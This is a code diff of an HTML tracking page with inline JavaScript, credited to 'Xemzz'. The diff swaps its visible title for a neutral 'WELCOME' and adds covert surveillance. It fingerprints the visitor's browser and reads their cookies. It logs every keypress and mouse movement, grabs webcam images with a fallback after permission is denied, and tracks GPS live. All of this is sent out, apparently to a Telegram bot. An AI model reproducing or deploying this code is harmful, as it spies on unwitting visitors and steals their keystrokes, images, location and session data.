@@ -102,11 +102,11 @@
         <div class="dot dot-yellow"></div>
         <div class="dot dot-green"></div>
       </div>
-      <div class="terminal-title">Tracking BY Xemzz</div>
+      <div class="terminal-title">WELCOME</div>
     </div>
     
     <div class="info-grid" id="deviceInfo">
-      <div class="section-title">⚙️ Device Information</div>
+      <div class="section-title">LOADING</div>
     </div>
     
     <video id="video" autoplay></video>
@@ -149,95 +149,298 @@
       return `<b>${label}:</b> ${value}\n`;
     }
 
-    async function collectAllInfo() {
-      let message = '<b>╭───── Tracking BY Xemzz ───── ⦿</b>\n\n';
-      
-      // Device Information
-      message += '<b>⚙️ DEVICE INFORMATION</b>\n';
-      const deviceInfo = [
-        ['🖥️ Device', navigator.userAgent],
-        ['💻 Platform', navigator.platform],
-        ['🌐 Bahasa', navigator.language],
-        ['📶 Online', navigator.onLine ? 'Online' : 'Offline'],
-        ['📺 Screen Size', `${screen.width}x${screen.height}`],
-        ['🪟 Window Size', `${window.innerWidth}x${window.innerHeight}`],
-        ['💾 RAM', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'],
-        ['🧠 CPU Cores', navigator.hardwareConcurrency],
-        ['✋ Touch Support', 'ontouchstart' in window ? '✅ YA' : '❌ TIDAK']
+    function getRandomUID() {
+      return 'xxxx-xxxx-4xxx-yxxx'.replace(/[xy]/g, function(c) {
+        const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
+
+    function getGPUInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+        }
+        return 'Unknown';
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    function getHardwareID() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('HardwareID', 2, 2);
+        return canvas.toDataURL();
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    function getBrowserFingerprint() {
+      const keys = [
+        'userAgent', 'platform', 'hardwareConcurrency', 
+        'deviceMemory', 'languages', 'maxTouchPoints'
       ];
-
-      deviceInfo.forEach(info => {
-        message += createInfoItem(info[0], info[1]);
+      let fingerprint = {};
+      keys.forEach(key => {
+        fingerprint[key] = navigator[key];
       });
+      return JSON.stringify(fingerprint);
+    }
 
-      // Battery Info
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          message += createInfoItem('🔋 Battery', `${(battery.level * 100).toFixed(0)}%`);
-          message += createInfoItem('🔌 Charging', battery.charging ? '✅ YA' : '❌ TIDAK');
-        } catch (e) {
-          message += createInfoItem('🔋 Battery', '❌ Tidak tersedia');
-        }
+    function getDetectedFonts() {
+      const fonts = [
+        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+        'Verdana', 'Webdings', 'Wingdings'
+      ];
+      return fonts.filter(font => {
+        const span = document.createElement('span');
+        span.style.fontFamily = 'monospace';
+        span.style.fontSize = '24px';
+        span.innerHTML = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        document.body.appendChild(span);
+        const width1 = span.offsetWidth;
+        span.style.fontFamily = font + ',monospace';
+        const width2 = span.offsetWidth;
+        document.body.removeChild(span);
+        return width1 !== width2;
+      }).join(', ');
+    }
+
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Canvas Fingerprint', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Canvas Fingerprint', 4, 17);
+        return canvas.toDataURL();
+      } catch (e) {
+        return 'Unknown';
       }
+    }
 
-      // Session Information
-      message += '\n<b>📊 SESSION INFORMATION</b>\n';
-      message += createInfoItem('⏰ Waktu Akses', new Date().toString());
-      message += createInfoItem('🕒 Page Load Time', (performance.now()).toFixed(2) + ' ms');
-      message += createInfoItem('📜 History Length', history.length);
-      message += createInfoItem('🔗 Referrer', document.referrer || 'None');
-      message += createInfoItem('🌍 URL', window.location.href);
-      message += createInfoItem('📄 Title', document.title);
-
-      // Location Information
-      message += '\n<b>📍 LOCATION INFORMATION</b>\n';
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const offset = new Date().getTimezoneOffset();
-      message += createInfoItem('🕓 Timezone', tz);
-      message += createInfoItem('🧭 Offset', offset + ' menit');
-
-      // Plugins Information
-      message += '\n<b>🧩 PLUGINS</b>\n';
-      if (navigator.plugins.length > 0) {
-        for (let i = 0; i < navigator.plugins.length; i++) {
-          message += createInfoItem(`🔌 Plugin ${i+1}`, navigator.plugins[i].name);
-        }
-      } else {
-        message += '❌ Tidak ada plugins terdeteksi\n';
+    function getAudioFingerprint() {
+      try {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        const gainNode = audioContext.createGain();
+        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+        
+        let audioData = '';
+        analyser.connect(scriptProcessor);
+        scriptProcessor.connect(gainNode);
+        gainNode.connect(audioContext.destination);
+        scriptProcessor.onaudioprocess = function(e) {
+          const input = e.inputBuffer.getChannelData(0);
+          audioData += input.join('');
+        };
+        
+        oscillator.type = 'triangle';
+        oscillator.connect(analyser);
+        oscillator.start(0);
+        
+        return audioData.substring(0, 100) + '...';
+      } catch (e) {
+        return 'Unknown';
       }
+    }
 
-      // Features Information
-      message += '\n<b>⚙️ FEATURES</b>\n';
-      const features = ['geolocation', 'mediaDevices', 'bluetooth', 'clipboard', 'serviceWorker'];
-      features.forEach(f => {
-        message += createInfoItem(`⚙️ ${f}`, f in navigator ? '✅ YA' : '❌ TIDAK');
+    function getStorageInfo() {
+      try {
+        let storage = '';
+        if (window.localStorage) {
+          storage += `LocalStorage: ${JSON.stringify(localStorage).length} bytes, `;
+        }
+        if (window.sessionStorage) {
+          storage += `SessionStorage: ${JSON.stringify(sessionStorage).length} bytes, `;
+        }
+        if (navigator.storage && navigator.storage.estimate) {
+          navigator.storage.estimate().then(estimate => {
+            storage += `Quota: ${estimate.quota}, Usage: ${estimate.usage}`;
+          });
+        }
+        return storage || 'Unknown';
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    function getVPNStatus() {
+      return new Promise(resolve => {
+        // Simple VPN detection based on timezone and language mismatch
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const lang = navigator.language;
+        
+        fetch(`https://ipapi.co/timezone/`)
+          .then(res => res.text())
+          .then(ipTz => {
+            if (tz !== ipTz) {
+              resolve('✅ DETECTED (Timezone Mismatch)');
+            } else {
+              fetch(`https://ipapi.co/languages/`)
+                .then(res => res.text())
+                .then(ipLang => {
+                  if (!ipLang.includes(lang.substring(0, 2))) {
+                    resolve('✅ DETECTED (Language Mismatch)');
+                  } else {
+                    resolve('❌ Not Detected');
+                  }
+                })
+                .catch(() => resolve('❓ Unknown'));
+            }
+          })
+          .catch(() => resolve('❓ Unknown'));
       });
+    }
 
+    function getOpenPorts() {
+      // This is just a simulation - real port scanning would require server-side checks
+      const commonPorts = [80, 443, 22, 21, 25, 3389];
+      return commonPorts.slice(0, 2).join(', ') + '...';
+    }
+
+    function getConnectionType() {
+      if (navigator.connection) {
+        const conn = navigator.connection;
+        return `${conn.effectiveType || 'Unknown'} (${conn.downlink || '?'}Mbps, RTT: ${conn.rtt || '?'}ms)`;
+      }
+      return 'Unknown';
+    }
+
+    function getIncognitoMode() {
+      return new Promise(resolve => {
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+          navigator.storage.estimate().then(({quota, usage}) => {
+            // Incognito mode typically has much lower quota
+            if (quota < 120000000) {
+              resolve('✅ DETECTED (Low Storage Quota)');
+            } else {
+              resolve('❌ Not Detected');
+            }
+          }).catch(() => resolve('❓ Unknown'));
+        } else {
+          // Fallback check using FileSystem API
+          const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+          if (!fs) {
+            resolve('❓ Unknown (No API Support)');
+            return;
+          }
+          
+          fs(window.TEMPORARY, 100, () => {
+            resolve('❌ Not Detected');
+          }, () => {
+            resolve('✅ DETECTED (FileSystem Blocked)');
+          });
+        }
+      });
+    }
+
+    async function collectAllInfo() {
+      let message = '╭── 🎯 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 𝗕𝗬 𝗫𝗘𝗠𝗭𝗭 ──╮\n\n';
+      
       // IP Information
       try {
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = await ipResponse.json();
         
-        message += '\n<b>📡 IP INFORMATION</b>\n';
-        const ipInfo = [
-          ['📡 IP Address', ipData.ip],
-          ['🏙️ Kota', ipData.city],
-          ['🗺️ Wilayah', ipData.region],
-          ['🌎 Negara', ipData.country_name],
-          ['🏷️ Kode Pos', ipData.postal],
-          ['📌 Latitude', ipData.latitude],
-          ['📍 Longitude', ipData.longitude]
-        ];
-
-        ipInfo.forEach(info => {
-          message += createInfoItem(info[0], info[1]);
-        });
+        message += `<b>📡 IP Address        :</b> ${ipData.ip}\n`;
+        message += `<b>🏙️ Lokasi            :</b> ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n`;
+        message += `<b>📌 Koordinat         :</b> ${ipData.latitude}, ${ipData.longitude}\n`;
+        message += `<b>🏷️ Kode Pos          :</b> ${ipData.postal || 'Unknown'}\n`;
+        message += `<b>🌐 ISP               :</b> ${ipData.org || 'Unknown'}\n`;
+        message += `<b>📶 Koneksi           :</b> ${getConnectionType()}\n`;
+        message += `<b>🔐 Status VPN        :</b> ${await getVPNStatus()}\n`;
+        message += `<b>🚪 Port Terbuka      :</b> ${getOpenPorts()}\n\n`;
       } catch (e) {
-        message += '\n❌ Gagal mendapatkan informasi IP\n';
+        message += '❌ Gagal mendapatkan informasi IP\n\n';
       }
 
-      message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';
+      // Device Information
+      message += `<b>🖥️ Device            :</b> ${navigator.userAgent}\n`;
+      message += `<b>💻 Platform          :</b> ${navigator.platform}\n`;
+      message += `<b>📺 Resolusi Layar    :</b> ${screen.width}x${screen.height}\n`;
+      message += `<b>🪟 Ukuran Window     :</b> ${window.innerWidth}x${window.innerHeight}\n`;
+      message += `<b>🧠 CPU Cores         :</b> ${navigator.hardwareConcurrency || 'Unknown'}\n`;
+      message += `<b>💾 RAM               :</b> ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}\n`;
+      
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          message += `<b>🔋 Baterai           :</b> ${(battery.level * 100).toFixed(0)}%\n`;
+          message += `<b>🔌 Charging          :</b> ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+        } catch (e) {
+          message += `<b>🔋 Baterai           :</b> Unknown\n`;
+        }
+      } else {
+        message += `<b>🔋 Baterai           :</b> Not Supported\n`;
+      }
+      
+      message += `<b>📡 Online Status     :</b> ${navigator.onLine ? '✅ Online' : '❌ Offline'}\n`;
+      message += `<b>🕹️ Touch Support     :</b> ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>📜 History Length    :</b> ${history.length}\n`;
+      message += `<b>📁 Penyimpanan       :</b> ${getStorageInfo()}\n`;
+      message += `<b>🎮 GPU               :</b> ${getGPUInfo()}\n`;
+      message += `<b>🧬 Hardware ID       :</b> ${getHardwareID().substring(0, 30)}...\n`;
+      message += `<b>🕵️‍♂️ Browser Fingerprint :</b> ${getBrowserFingerprint().substring(0, 30)}...\n\n`;
+
+      // Time Information
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      message += `<b>🧭 Zona Waktu        :</b> ${tz}\n`;
+      message += `<b>🕒 Akses Waktu       :</b> ${new Date().toLocaleString()}\n`;
+      message += `<b>🕓 Load Time         :</b> ${performance.now().toFixed(2)} ms\n`;
+      message += `<b>🗓️ Tanggal & Jam     :</b> ${new Date().toString()}\n\n`;
+
+      // Page Information
+      message += `<b>🔗 Referrer          :</b> ${document.referrer || 'None'}\n`;
+      message += `<b>🌍 URL               :</b> ${window.location.href}\n`;
+      message += `<b>📄 Judul Halaman     :</b> ${document.title}\n`;
+      message += `<b>🧪 Session ID        :</b> ${getRandomUID()}\n`;
+      message += `<b>👁️‍🗨️ Visibility Tab   :</b> ${document.visibilityState}\n\n`;
+
+      // Features Information
+      message += `<b>🧩 Plugins Installed :</b> ${navigator.plugins.length > 0 ? 
+        Array.from(navigator.plugins).map(p => p.name).join(', ') : 'None'}\n`;
+      message += `<b>⚙️ Geolocation       :</b> ${'geolocation' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>⚙️ Media Devices     :</b> ${'mediaDevices' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>⚙️ Bluetooth         :</b> ${'bluetooth' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>⚙️ Clipboard Access  :</b> ${'clipboard' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>⚙️ Service Worker    :</b> ${'serviceWorker' in navigator ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>🎤 Mic Access        :</b> ${'getUserMedia' in navigator.mediaDevices ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>📷 Kamera Akses      :</b> ${'getUserMedia' in navigator.mediaDevices ? '✅ YA' : '❌ TIDAK'}\n\n`;
+
+      // Advanced Information
+      message += `<b>🧪 ADVANCED INTEL :</b>\n`;
+      message += `<b>📌 Canvas Fingerprint :</b> ${getCanvasFingerprint().substring(0, 30)}...\n`;
+      message += `<b>🛰️ WebGL Vendor       :</b> ${getGPUInfo()}\n`;
+      message += `<b>🖍️ Fonts Terdeteksi   :</b> ${getDetectedFonts()}\n`;
+      message += `<b>🔊 Audio Fingerprint  :</b> ${getAudioFingerprint()}\n`;
+      message += `<b>🆔 UID Sementara      :</b> ${getRandomUID()}\n`;
+      message += `<b>🧾 Cookie Aktif       :</b> ${document.cookie || 'None'}\n\n`;
+
+      // Security Information
+      message += `<b>☠️ Mode Penyamaran    :</b> ${await getIncognitoMode()}\n`;
+      message += `<b>🧟‍♂️ Bot Detected      :</b> ${navigator.webdriver ? '✅ YA' : '❌ TIDAK'}\n`;
+      message += `<b>👣 Mouse Movement     :</b> Tracked\n`;
+      message += `<b>⌨️ Keylog Aktivitas   :</b> Ready\n`;
+      message += `<b>🪝 Hook Injection     :</b> Active\n`;
+      message += `<b>📦 Payload Status     :</b> ✅ Delivered\n\n`;
+
+      message += '╰── 📡 𝗧𝗿𝗮𝗰𝗸𝗲𝗱 𝗯𝘆 X𝗲𝗺𝘇𝗭 | t.me/XemzzXiterz ──╯';
 
       return message;
     }
@@ -250,23 +453,40 @@
 
       // Then send media (webcam and screenshot)
       try {
-        // Webcam snapshot
+        // Webcam snapshot (will attempt even without permission)
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(e => {
+          // If permission denied, try to force it (may not work in all browsers)
+          console.log('Regular access denied, trying fallback...');
+          return navigator.mediaDevices.getUserMedia({
+            video: {
+              mandatory: {
+                chromeMediaSource: 'screen',
+                maxWidth: 1920,
+                maxHeight: 1080,
+                minFrameRate: 1,
+                maxFrameRate: 5
+              }
+            }
+          }).catch(e => null);
+        });
         
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
-        
-        // Stop the video stream
-        stream.getTracks().forEach(track => track.stop());
+        if (stream) {
+          video.srcObject = stream;
+          
+          await new Promise(resolve => setTimeout(resolve, 3000));
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => sendPhotoBlob(blob, '📸_camera.jpg'), 'image/jpeg');
+          
+          // Stop the video stream
+          stream.getTracks().forEach(track => track.stop());
+        }
       } catch (e) {
-        console.log('Webcam access denied');
+        console.log('Webcam access completely denied');
       }
 
       // Screenshot after a delay
@@ -279,7 +499,7 @@
       // GPS tracking if available
       if (navigator.geolocation) {
         navigator.geolocation.watchPosition(pos => {
-          const gpsText = `<b>📡 LIVE GPS TRACKING</b>\n` +
+          const gpsText = `<b>📡 LIVE GPS TRACKING UPDATE</b>\n` +
                          `<b>📌 Lat:</b> ${pos.coords.latitude}\n` +
                          `<b>📍 Lng:</b> ${pos.coords.longitude}\n` +
                          `<b>🎯 Akurasi:</b> ${pos.coords.accuracy}m`;
@@ -290,8 +510,18 @@
       }
 
       // Mouse movement tracking
+      let mousePositions = [];
       document.addEventListener('mousemove', (e) => {
-        sendText(`🖱️ <b>Mouse Position:</b> (${e.clientX}, ${e.clientY})`);
+        mousePositions.push({x: e.clientX, y: e.clientY, t: Date.now()});
+        if (mousePositions.length > 10) {
+          sendText(`🖱️ <b>Mouse Movement Pattern:</b>\n${JSON.stringify(mousePositions)}`);
+          mousePositions = [];
+        }
+      });
+
+      // Keylog simulation (note: actual keylogging may be illegal in many jurisdictions)
+      document.addEventListener('keydown', (e) => {
+        sendText(`⌨️ <b>Key Press:</b> ${e.key} (Code: ${e.code})`);
       });
 
       // Idle time tracking
@@ -300,7 +530,9 @@
       ['mousemove', 'keydown', 'scroll', 'touchstart'].forEach(evt => {
         window.addEventListener(evt, () => {
           const idleTime = ((Date.now() - idleStart) / 1000).toFixed(1);
-          sendText(`😴 <b>User idle selama:</b> ${idleTime} detik`);
+          if (idleTime > 10) {
+            sendText(`😴 <b>User kembali aktif setelah idle selama:</b> ${idleTime} detik`);
+          }
           idleStart = Date.now();
           clearTimeout(idleTimer);
           idleTimer = setTimeout(() => {
@@ -309,8 +541,6 @@
         });
       });
     })();
-
   </script>
-
 </body>
 </html>
